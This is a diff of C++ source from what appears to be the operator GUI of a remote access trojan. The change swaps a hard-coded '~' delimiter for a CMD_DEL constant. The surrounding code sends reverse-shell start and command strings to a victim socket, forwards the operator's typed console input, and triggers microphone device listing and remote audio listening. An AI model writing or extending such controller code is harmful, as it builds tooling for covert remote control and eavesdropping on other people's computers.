@@ -107,7 +107,8 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     if (pageTitle == "Reverse Shell") {
         //Enviar comando para cerrar shell al cerra la tab
         std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-        strComando += "~exit\r\n";
+        strComando += CMD_DEL;
+        strComando += "exit\r\n";
         p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
         
     }
@@ -120,7 +121,8 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 
 void FrameCliente::OnClose(wxCloseEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-    strComando += "~exit\r\n";
+    strComando += CMD_DEL;
+    strComando += "exit\r\n";
     p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
     //setear estado en cliente para evitar error al tratar de cerrar el frame
     event.Skip();
@@ -194,7 +196,8 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
 
     //Enviar comando al cliente para que ejecute
     std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-    strComando += "~0";
+    strComando += CMD_DEL;
+    strComando += "0";
     p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
     
 }
@@ -236,7 +239,7 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
         int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
         wxString str1 = std::to_string(EnumComandos::Reverse_Shell_Command);
-        str1 += "~";
+        str1 += CMD_DEL;
         wxString str2 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
         str1 += str2;
         this->vc_History.push_back(str2);
@@ -245,7 +248,8 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         str1.append(1, '\n');
         
         std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-        strComando += "~0";
+        strComando += CMD_DEL;
+        strComando += "0";
         p_Servidor->cSend(this->sckCliente, str1.c_str(), str1.size()+1, 0, false);
         
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
@@ -309,14 +313,14 @@ panelMicrophone::panelMicrophone(wxWindow* pParent) :
 
 void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Refre_Dispositivos);
-    strComando.append(1, '~');
+    strComando.append(1, CMD_DEL);
     strComando.append(1, '0');
     //this->EnviarComando(strComando);
 }
 
 void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Iniciar_Escucha);
-    strComando.append(1, '~');
+    strComando.append(1, CMD_DEL);
     
     wxString str_device_id = this->mic_devices->GetStringSelection();
     std::cout << str_device_id << std::endl;
@@ -329,7 +333,7 @@ void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
 
 void panelMicrophone::OnDetener(wxCommandEvent& event) {
     std::string strComando = std::to_string(EnumComandos::Mic_Detener_Escucha);
-    strComando.append(1, '~');
+    strComando.append(1, CMD_DEL);
     //this->EnviarComando(strComando);
 }
 
